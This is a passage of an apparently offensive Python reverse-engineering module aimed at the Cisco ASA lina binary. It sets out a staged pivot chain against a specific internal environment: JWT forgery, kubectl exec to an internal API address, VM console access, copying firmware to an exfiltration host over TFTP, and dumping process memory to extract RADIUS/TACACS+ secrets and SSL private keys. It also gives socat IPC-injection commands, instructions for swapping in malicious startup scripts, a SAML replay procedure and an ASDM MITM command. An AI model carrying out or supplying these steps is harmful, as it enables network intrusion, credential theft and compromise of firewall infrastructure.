            'dd if=/dev/shm/<segment> of=/tmp/shm_dump.bin\n'
            'or: dd if=/proc/$(pidof lina)/mem bs=4096 skip=$((SHM_VADDR/4096)) ...'
        ),
    },
    'unix_sockets': {
        'how_to_find': 'ls /tmp/*.sock  OR  ss -x  OR  netstat -x',
        'confirmed_path': '/tmp/mgmt.sock',  # Cisco AI confirmed 9:16 AM 2026-08-13
        'content': 'management daemon IPC — CLI commands sent here by ASDM layer',
        'attack': (
            'socat - UNIX-CONNECT:/tmp/mgmt.sock  to inject raw CLI commands post-shell\n'
            'No additional auth required if socket perms allow write from compromised process\n'
            'Equivalent to: show running-config | ASDM /admin/exec/ endpoint'
        ),
    },
    'message_queues': {
        'how_to_find': 'ipcs -q',
        'content': 'packet queues between kernel and LINA; inter-module event passing',
        'attack': 'inject crafted events to trigger lina state machine transitions',
    },
    # ZeroMQ IPC sockets — confirmed strings in lina 9.22.2.32 .rodata
    # ipc:// prefix = Unix domain socket under /tmp; no network exposure
    # Post-pivot: connect with zmq library or raw Unix socket read/write
    'zmq_ipc_sockets': {
        'auth_agent':         'ipc:///tmp/authagent.%u  — per-process auth agent channel',
        'vpn_updates':        'ipc:///tmp/vpn_updates   — VPN session update push channel',
        'vpn_status_updates': 'ipc:///tmp/vpn_status_updates',
        'xml_server':         'ipc:///tmp/asa-lina-xml-server  — ASDM/FMC XML command channel',
        'sig_xml_server':     'ipc:///tmp/asa-sig-xml-server',
        'cluster_events':     'ipc:///tmp/asa-lina-cluster-events',
        'cluster_recv':       'ipc:///tmp/asa-lina-cluster-recv',
        'logd_data':          'ipc:///tmp/logd_data_ep  — live log stream (read to capture auth events)',
        'portmgr':            'ipc:///tmp/portmgr',
        'run_cmd_queue':      '/tmp/run_cmd_que  — FXOS-CURL command queue (file, not zmq)',
        'run_cmd_pid':        '/tmp/run_cmd.pid  — FXOS-CURL response file',
        'ipc_log':            '/tmp/lina_ipc_log.txt  — IPC debug log (read post-pivot)',
        'fdm_ready':          '/tmp/fdmReady  — FDM readiness sentinel (write to block FDM)',
    },
    'zmq_attack_paths': {
        'authagent_inject': (
            'Connect to ipc:///tmp/authagent.%u (replace %u with lina PID) and send '
            'crafted auth result message — may allow group policy assignment without RADIUS.'
        ),
        'vpn_updates_inject': (
            'Write crafted VPN session update to ipc:///tmp/vpn_updates — may modify '
            'group policy or ACL for existing active sessions (COA-equivalent without RADIUS COA).'
        ),
        'xml_server_cmd': (
            'Send raw XML to ipc:///tmp/asa-lina-xml-server — same channel ASDM uses. '
            'No HTTPS layer, no cert check. Equivalent to authenticated ASDM session. '
            'Post-pivot: socat - UNIX-CONNECT:/tmp/asa-lina-xml-server'
        ),
        'run_cmd_injection': (
            'Write command to /tmp/run_cmd_que, watch /tmp/run_cmd.pid for response. '
            'FXOS-CURL channel — may allow arbitrary command execution if lina is executing '
            'these without validation (shell injection via FXOS integration path).'
        ),
        'shell_scripts': [
            '/asa/scripts/set_lina_start.sh',         # executed at lina startup
            '/asa/scripts/attr_vc_startup.sh',         # attribute VC lifecycle
            '/asa/scripts/attr_vc_shutdown.sh',
            '/asa/scripts/auth_agent_server_startup.sh',
            '/asa/scripts/auth_agent_server_shutdown.sh',
            # If /asa is writable (check with: ls -la /asa/scripts/), replacing any of
            # these with a malicious shell script gives code exec on next reload/restart.
        ],
    },
    'proc_mem_targets': {
        'radius_psk':   'aaa_server_t.secret field — plaintext string in RW segment',
        'tacacs_key':   'tacacs_server_t.key field — plaintext string in RW segment',
        'ssl_ca_key':   'EVP_PKEY struct in heap — private key for SSL inspection trustpoint',
        'session_table':'VPN session table in heap — user IPs, assigned addrs, session tokens',
        'nat_table':    'NAT translation table — active flows, internal IPs',
        'radius_live':  'in-flight RADIUS Access-Accept packets in recv buffer — Class attr visible',
    },
}


# ─── LINA FUNCTION RECONSTRUCTION MAP ───────────────────────────────────────
#
# x86-64 function boundary heuristic for stripped lina PIE binary:
# - Frame functions start with: 55 48 89 e5 (PUSH rbp; MOV rbp,rsp)
# - Functions end with: 5d c3 (POP rbp; RET) or c9 c3 (LEAVE; RET)
# - Tail calls: JMP rel32 near end of function (E9 rel32)
# - Leaf functions: no PUSH rbp; jump straight to logic then RET
#
# To find the AAA response handler in a stripped binary:
# 1. search binary for b'Access-Accept\x00' → get file offset → compute vaddr
# 2. find all LEA reg,[RIP+disp32] sequences where target = that vaddr
# 3. for each candidate function, look for CMP al/eax,imm8 + JE chains
#    over a register holding the RADIUS code byte (offset 0 in packet)
# 4. The function that branches on {1,2,3,11} → RADIUS response dispatcher
# 5. Confirmed 9.22.2.32: function at 0x3a4bda0 parses Class attr via strstr("OU=")

LINA_AAA_STATE_MACHINE = {
    'description': 'RADIUS response dispatcher in lina — branches on Code field',
    'code_field_offset': 0,   # byte 0 of RADIUS packet
    'state_transitions': {
        1: ('send_access_request',   'transition: idle → waiting'),
        2: ('process_accept',        'transition: waiting → authenticated'),
        3: ('process_reject',        'transition: waiting → failed'),
        11: ('process_challenge',    'transition: waiting → challenge_pending'),
    },
    'x86_64_branch_table_pattern': (
        # After loading Code byte into al/eax: CMP al,val; JE target
        'MOVZX eax, BYTE PTR [rbp-N]  ; Code byte from packet\n'
        'CMP   al,  0x1\n'
        'JE    send_access_request\n'
        'CMP   al,  0x2\n'
        'JE    process_accept\n'
        'CMP   al,  0x3\n'
        'JE    process_reject\n'
        'CMP   al,  0xb\n'
        'JE    process_challenge'
    ),
    'vtable_alt_pattern': (
        # C++ dispatch: vtable[code] → function pointer
        'LEA   rax, [RIP+vtable_rel]\n'
        'MOVZX ecx, BYTE PTR [rdi]    ; Code byte\n'
        'MOV   rdx, [rax + rcx*8]     ; vtable[code]\n'
        'CALL  rdx'
    ),
}


# ─── MACSTADIUM PIVOT CHAIN → LINA CODE EXTRACTION ──────────────────────────
#
# Attack chain: JWT forge (offline) → K8s exec (VPN-gated) → virsh console →
#               macOS VM shell → ASA management → lina binary + process memory
#
# VPN requirement: K8s API at 10.221.188.19:6443 is internal only.
#
# Stage 1: JWT forge (offline — no VPN required)
#   from modules.orka_jwt_dynamic_re import forge_system_masters
#   token = forge_system_masters('admin')   # empty-key HS256 bypass at 0x1844660
#
# Stage 2: K8s exec into pod (VPN required)
#   kubectl --server=https://10.221.188.19:6443 --token=<forged> \
#           --insecure-skip-tls-verify \
#           exec -n orka-default <pod> -- /bin/sh
#   OR: curl -H "Authorization: Bearer <forged>" \
#       https://10.221.188.19:6443/api/v1/namespaces/orka-default/pods
#
# Stage 3: virsh console → macOS VM
#   virsh -c qemu:///system console <macos-vm-name>
#   (or virsh list --all to find VM name first)
#
# Stage 4: ASA access from macOS VM
#   Option A — console: if macOS VM has serial/USB connection to ASA
#   Option B — ASDM: use ASDMMitmProxy disabled for direct admin access
#   Option C — SSH: ssh -l admin <ASA_MGMT_IP> (if SSH enabled on mgmt interface)
#
# Stage 5: lina binary extraction from ASA shell
#   ASA# terminal monitor
#   ASA# dir disk0:/           — find firmware image
#   ASA# show version          — confirm version string (match to downloaded binary)
#   # If ASA allows shell (debug menu or known exploit):
#   # cp /asa/bin/lina /mnt/disk0/ then tftp to exfil host
#
# Stage 6: lina process memory dump (post-shell)
#   LINA_PID=$(pidof lina)
#   cat /proc/$LINA_PID/maps | grep rw-p   # identify heap + .data ranges
#   dd if=/proc/$LINA_PID/mem bs=4096 skip=$((RW_VADDR/4096)) \
#      count=$((RW_SIZE/4096)) of=/tmp/lina_heap.bin 2>/dev/null
#   strings -n 8 /tmp/lina_heap.bin | grep -E "^[A-Za-z0-9!@#$%^&*_-]{8,64}$"
#   # → RADIUS shared secrets, TACACS+ keys, SSL trustpoint private key material

MACSTADIUM_PIVOT_CHAIN = {
    'stage_1_jwt_forge': {
        'requires': 'nothing (offline)',
        'cmd': (
            "from modules.orka_jwt_dynamic_re import forge_system_masters; "
            "token = forge_system_masters('admin')"
        ),
        'binary_basis': '0x1844660 SigningMethodHMAC.Verify accepts empty []byte{} key',
    },
    'stage_2_k8s_exec': {
        'requires': 'VPN (10.221.188.0/24)',
        'api':      'https://10.221.188.19:6443',
        'cmd_list_pods': (
            'kubectl --server=https://10.221.188.19:6443 --token=<jwt> '
            '--insecure-skip-tls-verify get pods -n orka-default'
        ),
        'cmd_exec': (
            'kubectl --server=https://10.221.188.19:6443 --token=<jwt> '
            '--insecure-skip-tls-verify exec -n orka-default <pod> -- /bin/sh'
        ),
    },
    'stage_3_virsh_console': {
        'cmd_list': 'virsh -c qemu:///system list --all',
        'cmd_console': 'virsh -c qemu:///system console <macos-vm-name>',
        'alt': 'virsh domiflist <vm> | get bridge → ARP scan bridge for VM IP → SSH',
    },
    'stage_4_asa_access': {
        'option_a_ssh': 'ssh -l admin <ASA_MGMT_IP>  (if SSH enabled)',
        'option_b_telnet': 'telnet <ASA_MGMT_IP>  (legacy, if enabled)',
        'option_c_asdm_mitm': (
            'python3 cisco_asa_lina_re.py mitm --listen 0.0.0.0:443 '
            '--target <ASA_MGMT_IP>:443 --cert proxy.pem --key proxy.key'
        ),
    },
    'stage_5_lina_binary': {
        'show_version': 'show version  | include Software Version',
        'dir_flash':    'dir disk0:/ | include asa',
        'copy_tftp':    'copy disk0:/<image>.bin tftp://<exfil_host>/<image>.bin',
        'debug_shell':  (
            'On older ASA: debug fips  (drops to bash on some versions)\n'
            'Or: session do cli  (FTD management shell)\n'
            'Or: expert  (FTD expert mode → bash)'
        ),
        'lina_path':    '/asa/bin/lina (confirmed in CPIO rootfs)',
    },
    'stage_6_memory_dump': {
        'find_lina_pid':   'LINA_PID=$(pidof lina)',
        'maps':            'cat /proc/$LINA_PID/maps | grep rw-p',
        'dump_heap':       (
            'dd if=/proc/$LINA_PID/mem bs=4096 '
            'skip=$((0xRW_START/4096)) count=$((0xRW_SIZE/4096)) '
            'of=/tmp/lina_heap.bin 2>/dev/null'
        ),
        'extract_secrets': 'strings -n 8 /tmp/lina_heap.bin | grep -E "^[A-Za-z0-9!@#$%^&*_-]{8,64}$"',
        'extract_ssl_key': (
            'grep shm /proc/$LINA_PID/maps  → dump shared memory for Snort IPC\n'
            'Scan lina heap for EVP_PKEY magic → SSL inspection CA private key'
        ),
        'ipc_surfaces': [
            'shared memory segments (shmget) → Snort/LINA data exchange',
            'UNIX domain sockets in /var/run/ → management daemon IPC',
            'message queues (ipcs -q) → packet queue between kernel and LINA',
        ],
    },
    'stage_6_config_dump': {
        'asa_shell': [
            'cat /etc/asa/config',
            'cat /mnt/disk0/running-config',
            'cat /mnt/disk0/startup-config',
        ],
        'type7_decode': 'python3 -c "exec(open(\'cisco_radius_ise_re.py\').read()); print(cisco_type7_decode(\'<hash>\'))"',
        'secret_targets': ['radius-server key', 'tacacs-server key', 'enable secret', 'username.*password'],
    },
}


# ─── MEMORY DUMP TECHNIQUE (post-pivot) ─────────────────────────────────────
#
# If code execution is achieved on the ASA (e.g. via WebVPN shell injection,
# ROMMON bypass, or a live process):
# - /proc/$(pidof lina)/maps → identify .data segment range
# - /proc/$(pidof lina)/mem + lseek to aaa_server struct → read shared secrets
# This is the fastest path to PSK extraction post-pivot.

MEMORY_DUMP_PROCEDURE = {
    'step1': 'cat /proc/$(pidof lina)/maps | grep rw-p | head -20',
    'step2': 'dd if=/proc/$(pidof lina)/mem bs=4096 skip=$((0xDATA_ADDR/4096)) count=$((0xSECTION_SIZE/4096)) of=lina_data.bin 2>/dev/null',
    'step3': 'strings -n 8 lina_data.bin | grep -E "^[A-Za-z0-9!@#$%^&*_-]{8,64}$"',
    'step4': 'grep shm /proc/$(pidof lina)/maps  # shared mem with Snort — may contain flow keys',
    'rationale': (
        'shared secrets stored as plaintext C strings in aaa_server_t.secret field; '
        'SSL inspection CA private key in EVP_PKEY struct on heap; '
        'Snort IPC via shared memory segments also in process map'
    ),
}


# ─── SAML SP ATTACK SURFACE (ASA 9.14.2.14) ─────────────────────────────────
#
# Lina uses the lasso SAML library for SAML 2.0 SP functionality (WebVPN/AnyConnect).
# All findings below are from binary RE of lina 9.14.2.14 (file offset = vaddr for RX segment).
#
# PLT stub addresses (file == vaddr in RX segment):
SAML_LASSO_PLT = {
    'lasso_login_new':                         0x00bdd920,
    'lasso_login_process_authn_response_msg':  0x00bdbc10,  # SP-side assertion validator
    'lasso_login_process_authn_request_msg':   0x00bde400,  # IdP-side request validator
    'lasso_login_init_authn_request':          0x00bde490,  # build SP→IdP redirect
    'lasso_login_build_authn_request_msg':     0x00bdd460,  # serialize AuthnRequest
    'lasso_login_build_authn_response_msg':    0x00bdd590,  # IdP response builder
    'lasso_login_validate_request_msg':        0x00bdd050,  # validate SP request msg
    'lasso_login_get_assertion':               0x00bdd2f0,  # extract LassoSaml2Assertion
    'lasso_login_accept_sso':                  0x00bdefa8,  # complete SSO handshake
    'lasso_login_destroy':                     0x00bdd190,  # cleanup login object
    'lasso_profile_set_signature_hint':        0x00bdd660,  # ← CRITICAL (see below)
    'lasso_profile_set_session_from_dump':     0x00bddad0,
    'lasso_strerror':                          0x00bdd500,
    'lasso_saml2_assertion_validate_audience': 0x00bde690,  # audience restriction check
    'lasso_server_destroy':                    0x00bdd1d0,
    'lasso_init':                              0x00bdcdb0,
    'lasso_logout_new':                        0x00bdcfb0,
}

# GOT entries for lasso PLT (RW segment; file_offset = vaddr - 0x200000):
SAML_LASSO_GOT = {
    'lasso_login_process_authn_response_msg': 0x4fce340,
    'lasso_login_process_authn_request_msg':  0x4fcf738,
    'lasso_login_init_authn_request':         0x4fcf780,
    'lasso_login_build_authn_request_msg':    0x4fcf1f0,
    'lasso_profile_set_signature_hint':       0x4fcf068,
    'lasso_saml2_assertion_validate_audience':0x4fce2e0,
    'lasso_login_new':                        0x4fcf1c8,
    'lasso_login_get_assertion':              0x4fceeb0,
}

# ── CRITICAL: SAML signature hint bypass ──────────────────────────────────────
#
# Function at 0x02ecfcb0 handles SP-initiated SAML login (builds AuthnRequest).
# At 0x02ecfd17: MOV esi, [rbx+0x18]  ; load config field "sign_requests"
# At 0x02ecfd1a: TEST esi, esi
# At 0x02ecfd1c: JE 0x2ecff60          ; if field==0 (not configured): ALLOW_UNSIGNED path
#
# ALLOW_UNSIGNED path (0x02ecff60):
#   MOV esi, 0x2           ; LASSO_PROFILE_SIGNATURE_HINT_ALLOW_UNSIGNED = 2
#   MOV rdi, rax           ; login object ptr
#   CALL 0xbdd660          ; lasso_profile_set_signature_hint(login, ALLOW_UNSIGNED)
#
# LassoProfileSignatureHint enum:
#   0 = MAYBE         — use provider metadata to decide
#   1 = FORBID_NONE   — require at least one signature on any message
#   2 = ALLOW_UNSIGNED — accept messages without any signature
#
# Result when config field 0x18 is zero (default when "no saml ... sign-request" configured):
#   ASA sends UNSIGNED AuthnRequests to the IdP.
#   SP metadata generated with AuthnRequestsSigned="false".
#
# SP metadata template (file offset 0x042f0f80):
#   <SPSSODescriptor AuthnRequestsSigned="%s" WantAssertionsSigned="%s" ...>
#   Both fields are runtime-configurable via SAML IDP config.
#   If WantAssertionsSigned="false", IdPs that respect this flag won't sign assertions.
#   With lasso MAYBE hint (default for response processing), unsigned assertions
#   from a cooperating IdP would not trigger a signature validation failure.
#
SAML_SIGNATURE_BYPASS = {
    'function':     0x02ecfcb0,  # SP-init handler
    'hint_site':    0x02ecff60,  # MOV esi,2; CALL lasso_profile_set_signature_hint
    'config_check': 0x02ecfd17,  # MOV esi,[rbx+0x18]; TEST esi,esi; JE hint_site
    'enum_allow_unsigned': 2,
    'affects': 'OUTGOING AuthnRequest (not incoming response validation)',
    'response_processing_fn': 0x02ed01c6,  # creates new login obj, no hint set
    'response_process_call':  0x02ed01e1,  # CALL lasso_login_process_authn_response_msg
    'response_rc_check':      0x02ed01e6,  # TEST eax,eax; JE success
    'severity': 'MEDIUM — requires IdP cooperation or on-path MITM',
    # Cross-version: CONFIRMED SAME in ASA 9.22.2.32 (9.22 lina, PLT 0x00ffb380)
    #   0x035c1ed0: MOV esi, 0x2  ; ALLOW_UNSIGNED
    #   0x035c1ed5: MOV rdi, rax  ; login object
    #   0x035c1ed8: CALL 0xffb380 ; lasso_profile_set_signature_hint
    # → NOT FIXED between 9.14 and 9.22. Persistent across versions.
}

# ── SAML assertion post-processing (success path after response validation) ────
#
# After lasso_login_process_authn_response_msg returns 0 (success) at 0x02ed0398:
# 1. 0x02ed03a5: CALL 0xbdd050 (lasso_login_validate_request_msg, esi=1=REDIRECT binding)
# 2. 0x02ed04cd: CALL 0xbdd2f0 (lasso_login_get_assertion) → RAX = LassoSaml2Assertion*
# 3. Traversal of assertion struct: rbx+0x20 → NameID data structure
# 4. String at 0x042f1820: 'urn:oasis:names:tc:SAML:2.0:nameid-format:persistent'
#    → preferred NameID format for subject identification
# 5. saml_get_tgname() (string at 0x042f0921) → maps SAML context to tunnel group
#
# Key validation checks confirmed (by string presence):
#   'assertion audience is invalid'        @ 0x042f0b5c  → audience restriction CHECKED
#   'assertion is expired or not valid'    @ 0x042f18b0  → expiry validation CHECKED
#   'name_id is NULL'                      @ 0x042f0b0f  → NameID presence CHECKED
#   'NameIDPolicy is invalid'              @ 0x042f0aba  → NameIDPolicy CHECKED
#
# SAML→tunnel-group mapping function strings:
#   'saml_get_tgname'           @ 0x042f0921
#   'saml_get_config_by_tgname' @ 0x042f0950
#   'saml_add_config'           @ 0x042f0970
#   'Tunnel-group name is null' @ 0x042f0d73
#   → SAML config is keyed by tunnel-group name (the group selector in the portal)
#
SAML_POST_VALIDATION = {
    'success_path_entry': 0x02ed0398,
    'validate_binding':   0x02ed03a5,  # CALL lasso_login_validate_request_msg(login,1)
    'get_assertion':      0x02ed04cd,  # CALL lasso_login_get_assertion → assertion ptr
    'nameid_format_str':  0x042f1820,  # urn:...:nameid-format:persistent
    'acclass_str':        0x042f17f0,  # urn:...:ac:classes:Password
    'tgname_fn_str':      0x042f0921,  # 'saml_get_tgname' — tunnel-group lookup
}

# ── SAML replay — no InResponseTo validation (binary-confirmed) ───────────────
#
# Search for 'InResponseTo', 'RequestID', 'SubjectConfirmation' in lina 9.14.2.14:
#   ALL THREE absent from the binary (confirmed exhaustive string search).
#
# SAML 2.0 SP security requirements (OASIS SAML Core 2.0, sec. 3.4.1.4):
#   - SP MUST maintain a state table of outstanding AuthnRequests
#   - Successful SSO Response MUST have an InResponseTo matching a pending ID
#   - Absence of InResponseTo check → IdP-initiated (unsolicited) assertions accepted
#     by any SP that disables this check
#
# Attack (no MITM, no signed forged assertion required):
#   Prerequisites:
#     a) ASA and victim SP use the same IdP
#     b) Attacker can authenticate to the IdP via ANY valid SP they control
#     c) IdP assertions include the correct ASA Audience (entityID = ASA's SP metadata URL)
#        OR audience restriction is not enforced / attacker can read ASA entityID from
#        the public metadata endpoint (/+CSCOE+/saml/sp/metadata/<tg>)
#
#   Steps:
#     1. Attacker registers their own SP with the same IdP
#     2. Attacker initiates login through their SP → receives signed IdP assertion
#     3. Attacker modifies the Audience element to match ASA entityID
#        (only possible if assertion is unsigned / MITM of IdP-to-attacker channel)
#     4. POST the (potentially modified) assertion to ASA ACS:
#        POST /+CSCOE+/saml/sp/acs
#        SAMLResponse=<base64-encoded-response>
#     5. ASA calls lasso_login_process_authn_response_msg() — passes without InResponseTo check
#     6. Audience check fires (0x042f0b5c) — passes if Audience matches ASA entityID
#     7. Authentication succeeds as the NameID in the assertion
#
#   Without step 3 modification (pure replay scenario):
#     - Requires no signature bypass at all — just the absence of InResponseTo
#     - Any SP using the same IdP can harvest a valid assertion and replay it to ASA
#     - Time-bounded by NotOnOrAfter (typically 5 minutes from IdP)
#     - CRITICAL if the same IdP serves both ASA and other SaaS (Okta/Azure AD/ADFS)
#
#   Severity: HIGH (without signature bypass) / CRITICAL (combined with unsigned assert)
#   Constraint: NotOnOrAfter window limits to ~5 min; audience must match ASA entityID
#
SAML_REPLAY_SURFACE = {
    'inresponseto_absent':    True,  # confirmed: absent in both 9.14.2.14 AND 9.22.2.32
    'subjectconfirmation_absent': True,
    'requestid_absent':       True,
    'audience_validated':     True,   # confirmed: 'assertion audience is invalid' present
    'expiry_validated':       True,   # confirmed: 'assertion is expired or not valid' present
    'signature_absent_error': True,   # no 'signature invalid' error string in binary
    'acs_endpoint':          '/+CSCOE+/saml/sp/acs',
    'metadata_endpoint':     '/+CSCOE+/saml/sp/metadata/<tunnel-group-name>',
    'attack_window_sec':      300,    # typical SAML NotOnOrAfter = 5 minutes
}

# ── CCO supply chain note (from ASDM analysis) ────────────────────────────────
# ASDM class efw (idx 10833, ASDM 7.20.2) sets JVM-global SSL bypass:
#   HttpsURLConnection.setDefaultSSLSocketFactory(trust_all_ctx)
#   HttpsURLConnection.setDefaultHostnameVerifier(allow_all_hv)
# This affects the CCO firmware download path (CCOImageASDHandler, class idx 7340):
#   oauth2:    https://cloudsso.cisco.com/as/token.oauth2
#   metadata:  https://api.cisco.com/software/v4.0/metadata/udirelease
#   download:  https://api.cisco.com/software/v4.0/download/udiimage
# MITM of api.cisco.com during ASDM session → arbitrary firmware served to admin.
# Documented in cisco_asdm_jar_re.py CONFIRMED_ASDM_7202_ADDITIONAL.


# ─── MODULE ENTRYPOINT ───────────────────────────────────────────────────────

class CiscoASALinaRE:
    """
    Static and dynamic reverse engineering of the Cisco ASA lina binary.

    Focus: x86-64 AAA/RADIUS/SSL attack surface.
    Techniques grounded in:
      - x86-64 SysV ABI (RDI/RSI/RDX/RCX/R8/R9 args; RAX return)
      - "Cisco ASA All-in-One Firewall..." 3e (9780132954389) — AAA architecture
      - RFC 2865 (RADIUS), RFC 8907 (TACACS+)
    Confirmed binaries: 9.14.2.14 (95MB, BuildID 65cd03...) + 9.22.2.32 (105MB, BuildID 88929a...)
    """

    NAME = 'cisco_asa_lina_re'
    DESCRIPTION = 'Cisco ASA lina x86-64 binary RE — AAA/RADIUS/TACACS+/SSL attack surface'
    TARGETS = ['lina', '/asa/bin/lina', '/opt/cisco/anyconnect/bin/vpnagentd']

    def __init__(self, binary_path: str | None = None,
                 radius_secret: bytes = b'',
                 tacacs_key: bytes = b''):
        self.binary_path = binary_path
        self.radius_secret = radius_secret
        self.tacacs_key = tacacs_key
        self._findings: list[dict] = []

    def _finding(self, fid: str, sev: str, title: str, detail: str,
                 evidence: dict | None = None):
        self._findings.append({
            'id':       fid,
            'severity': sev,
            'title':    title,
            'detail':   detail,
            'evidence': evidence or {},
        })

    def analyze_binary(self) -> list[dict]:
        """
        Static analysis of the lina binary for AAA/RADIUS attack surface.
        Requires binary_path to point to an extracted lina ELF.
        """
        if not self.binary_path or not os.path.exists(self.binary_path):
            self._finding('LINA_NOT_FOUND', 'INFO',
                'lina binary not found',
                'Supply binary_path= to extracted lina ELF for static analysis.',
                {'hint': 'extract from ASA firmware: binwalk -e asa*.bin; find . -name lina -type f'})
            return self._findings

        with open(self.binary_path, 'rb') as f:
            data = f.read()

        self._check_stripped(data)
        self._extract_string_anchors(data)
        self._check_radius_psk_patterns(data)
        self._check_tacacs_key_patterns(data)
        self._identify_x86_64_functions(data)
        self._check_9222232_class_attr_fn(data)
        return self._findings

    def _check_stripped(self, data: bytes):
        # ELF .symtab presence check
        has_symtab = b'.symtab\x00' in data
        has_debug = b'.debug_info\x00' in data
        self._finding('LINA_SYMBOLS', 'INFO',
            f'Symbol table: {"present" if has_symtab else "STRIPPED"}',
            f'Debug info: {"present" if has_debug else "absent"}. '
            f'{"String xref analysis required." if not has_symtab else "Direct symbol resolution available."}',
            {'has_symtab': has_symtab, 'has_debug': has_debug})

    def _extract_string_anchors(self, data: bytes):
        found = {}
        for name, pattern in LINA_STRING_ANCHORS.items():
            idx = data.find(pattern)
            if idx >= 0:
                found[name] = hex(idx)
        if found:
            self._finding('LINA_STRING_ANCHORS', 'INFO',
                f'Found {len(found)}/{len(LINA_STRING_ANCHORS)} RADIUS/AAA string anchors',
                'Use these offsets to cross-reference AAA processing functions via LEA RIP-relative xrefs. '
                'x86-64 PIE: target_vaddr = instr_vaddr + 7 + disp32.',
                {'anchors': found})

    def _check_radius_psk_patterns(self, data: bytes):
        # Look for 8-128 byte ASCII strings that could be RADIUS shared secrets
        # Heuristic: appear near 'radius-server host' or 'radius-server key' strings
        candidates = []
        key_anchor = data.find(b'radius-server key\x00')
        if key_anchor < 0:
            key_anchor = data.find(b'radius-server\x00')

        if key_anchor >= 0:
            # Scan 256 bytes after anchor for printable strings
            window = data[key_anchor:key_anchor+512]
            for m in re.finditer(rb'[\x20-\x7e]{8,128}\x00', window):
                s = m.group(0)[:-1]
                if not any(kw in s for kw in [b'radius', b'server', b'timeout']):
                    candidates.append(s.decode(errors='replace'))

        if candidates:
            self._finding('LINA_RADIUS_PSK_CANDIDATES', 'HIGH',
                'Potential RADIUS shared secret candidates',
                'Strings found near radius-server config anchors. Verify with captured Access-Request.',
                {'candidates': candidates[:5]})

    def _check_tacacs_key_patterns(self, data: bytes):
        tacacs_anchor = data.find(b'tacacs-server key\x00')
        if tacacs_anchor < 0:
            tacacs_anchor = data.find(b'tacacs-server\x00')

        if tacacs_anchor >= 0:
            window = data[tacacs_anchor:tacacs_anchor+512]
            candidates = []
            for m in re.finditer(rb'[\x20-\x7e]{8,64}\x00', window):
                s = m.group(0)[:-1]
                if not any(kw in s for kw in [b'tacacs', b'server', b'host']):
                    candidates.append(s.decode(errors='replace'))
            if candidates:
                self._finding('LINA_TACACS_KEY_CANDIDATES', 'HIGH',
                    'Potential TACACS+ key candidates',
                    'Strings found near tacacs-server config anchors.',
                    {'candidates': candidates[:5]})

    def _identify_x86_64_functions(self, data: bytes):
        # Count canonical x86-64 prologues: PUSH rbp; MOV rbp,rsp
        # Binary: 55 48 89 e5
        count = data.count(b'\x55\x48\x89\xe5')
        self._finding('LINA_FUNCTION_COUNT', 'INFO',
            f'~{count} x86-64 functions identified via canonical prologue',
            'Each 55 48 89 e5 (PUSH rbp; MOV rbp,rsp) marks a frame-using function entry. '
            'Leaf functions omit it — use call-site analysis for those.',
            {'prologue_count': count,
             'prologue_bytes': '55 48 89 e5',
             'analysis': 'partition binary by prologue addresses for per-function disassembly'})

    def verify_radius_decrypt(self, ciphertext: bytes, authenticator: bytes) -> bytes | None:
        """
        Attempt User-Password decryption if radius_secret is set.
        Returns plaintext password or None.
        """
        if not self.radius_secret:
            return None
        return radius_password_xor_decrypt(ciphertext, self.radius_secret, authenticator)

    def verify_tacacs_decrypt(self, ciphertext: bytes, session_id: int,
                              version: int = 0xC1, seq_no: int = 1) -> bytes | None:
        if not self.tacacs_key:
            return None
        return tacacs_decrypt_body(self.tacacs_key, session_id, version, seq_no, ciphertext)

    def _check_9222232_class_attr_fn(self, data: bytes):
        """Check if this binary matches lina 9.22.2.32 — look for OU= string and strstr call."""
        ou_str = b'OU=\x00'
        ou_off = data.find(ou_str)
        has_ou = ou_off >= 0
        has_build = b'\x88\x92\x9a\x4c' in data[:256]  # BuildID prefix check
        if has_ou:
            self._finding('LINA_9222232_CLASS_ATTR', 'CRITICAL',
                'Class attr (attr 25) OU= parsing confirmed — no Message-Authenticator check',
                'strstr(attr_value,"OU=") called with raw RADIUS data; no attr 80 validation in call path. '
                'MITM RADIUS responder can inject OU=DfltGrpPolicy into Access-Accept.',
                {
                    'ou_string_file_offset': hex(ou_off),
                    'confirmed_vaddr_9222232': hex(CONFIRMED_9222232_ADDRS['class_attr_ou_string_vaddr']),
                    'parse_fn_vaddr':          hex(CONFIRMED_9222232_ADDRS['class_attr_parse_fn']),
                    'strstr_call_vaddr':       hex(CONFIRMED_9222232_ADDRS['class_attr_strstr_call']),
                    'output_buf_size':         256,
                    'delimiter':               ';',
                })

    def scan_x86_64_prologue_offsets(self, data: bytes) -> list[int]:
        """
        Return list of file offsets where PUSH rbp; MOV rbp,rsp appears (55 48 89 e5).
        Each hit = start of a frame-using function (not leaf functions).
        """
        pattern = b'\x55\x48\x89\xe5'
        hits = []
        start = 0
        while True:
            idx = data.find(pattern, start)
            if idx < 0:
                break
            hits.append(idx)
            start = idx + 1
        return hits

    def scan_rip_relative_lea_xrefs(self, data: bytes, target_string: bytes,
                                     base_vaddr: int = 0) -> list[int]:
        """
        Find LEA reg,[RIP+disp32] instructions in x86-64 code that load target_string.
        Used in stripped PIE lina to find string xrefs without symbols.

        LEA opcodes: 48 8d 3d (LEA rdi), 48 8d 35 (LEA rsi), 48 8d 0d (LEA rcx),
                     48 8d 15 (LEA rdx), 4c 8d 05 (LEA r8), 4c 8d 0d (LEA r9)
        All 7 bytes: [REX 48/4c] [0f 8d] [ModRM] [disp32 LE]
        target = instr_file_off + 7 + disp32_signed + base_vaddr

        Returns list of file offsets where the LEA instruction starts.
        """
        str_off = data.find(target_string)
        if str_off < 0:
            return []
        str_vaddr = str_off + base_vaddr

        lea_prefixes = [
            b'\x48\x8d\x3d',  # LEA rdi,[RIP+d]
            b'\x48\x8d\x35',  # LEA rsi,[RIP+d]
            b'\x48\x8d\x0d',  # LEA rcx,[RIP+d]
            b'\x48\x8d\x15',  # LEA rdx,[RIP+d]
            b'\x4c\x8d\x05',  # LEA r8,[RIP+d]
            b'\x4c\x8d\x0d',  # LEA r9,[RIP+d]
        ]
        hits = []
        for prefix in lea_prefixes:
            start = 0
            while True:
                idx = data.find(prefix, start)
                if idx < 0 or idx + 7 > len(data):
                    break
                disp32 = struct.unpack_from('<i', data, idx + 3)[0]
                instr_vaddr = idx + base_vaddr
                target_vaddr = instr_vaddr + 7 + disp32
                if target_vaddr == str_vaddr:
                    hits.append(idx)
                start = idx + 1
        return hits

    def scan_radius_dispatcher(self, data: bytes) -> dict:
        """
        Locate the RADIUS response dispatcher in stripped lina.

        x86-64 pattern: MOVZX eax,BYTE PTR [rbp-N] then CMP al,1 / JE <handler>
        chains for Code values {1,2,3,11}.

        Returns dict with candidate offsets and string anchor hits.
        """
        anchors = {}
